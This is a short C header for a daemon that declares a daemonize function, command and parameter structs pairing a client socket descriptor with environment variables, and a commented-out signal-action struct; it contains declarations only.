#ifndef DAEMON_H
#define DAEMON_H

#include <sys/types.h>
#include <fcntl.h>
#include <signal.h>

int	daemonize(char **envp);

//int	daemonize(void (*famine)(void));

typedef struct param_s param_t;

typedef struct command_s {
	char *name;
	void (*func)(param_t *);
} command_t;

typedef struct param_s {
	int client_fd;
	char **envp;
} param_t;


//struct kernel_sigaction {
//	union {
//		void (*sa_handler)(int);
//		void (*sa_sigaction)(int, siginfo_t *, void *);
//	}
//



typedef void (*command_func_t)(param_t *);

#endif
